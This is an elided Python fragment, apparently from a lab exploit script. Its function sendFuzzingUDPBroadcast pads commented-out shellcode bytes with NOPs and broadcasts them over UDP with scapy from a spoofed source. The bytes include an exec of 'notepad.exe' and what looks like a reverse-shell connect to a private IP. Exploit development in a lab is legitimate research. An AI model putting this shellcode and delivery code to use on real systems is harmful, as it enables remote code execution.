...
def sendFuzzingUDPBroadcast(ip="255.255.255.255", sport=5050, dport=5060):
    ...
    # buf += b"\xff\xd5\x6e\x6f\x74\x65\x70\x61\x64\x2e\x65\x78\x65"
    # buf += b"\x20\x74\x65\x73\x74\x2e\x74\x78\x74\x00"
    ...
    # buf += b"\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x0b\x01\x68\x02"
    # buf += b"\x00\x01\xbd\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50"
    ...
    # buf += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x01\xbf\x89"
    ...
    request += buf
    request += b"\x90"*(260-len(buf))

    scapy.all.sendp( Ether(src='00:22:ca:88:a5:d0', dst="ff:ff:ff:ff:ff:ff")/IP(src='192.168.10.89',dst=ip)/UDP(sport=sport,dport=dport)/Raw(load=request),  iface="vmnet4" )
